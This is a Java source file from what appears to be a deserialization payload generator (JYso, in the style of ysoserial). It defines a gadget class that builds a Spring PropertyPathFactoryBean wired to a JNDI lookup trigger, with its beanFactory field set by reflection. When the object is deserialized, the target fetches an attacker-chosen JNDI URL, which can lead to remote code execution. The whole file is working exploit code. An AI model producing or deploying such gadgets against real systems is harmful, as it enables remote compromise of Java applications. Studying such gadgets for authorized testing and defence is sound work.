package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.utils.Reflections;
import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.beans.factory.BeanFactory;
import org.springframework.beans.factory.config.PropertyPathFactoryBean;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

public class SpringPropertyPathFactory implements ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        String jndiUrl = command;
        BeanFactory bf = SpringUtil.makeJNDITrigger(jndiUrl);

        PropertyPathFactoryBean ppf = new PropertyPathFactoryBean();
        ppf.setTargetBeanName(jndiUrl);
        ppf.setPropertyPath("foo");

        Reflections.setFieldValue(ppf, "beanFactory", bf);
        return ppf;
    }
}
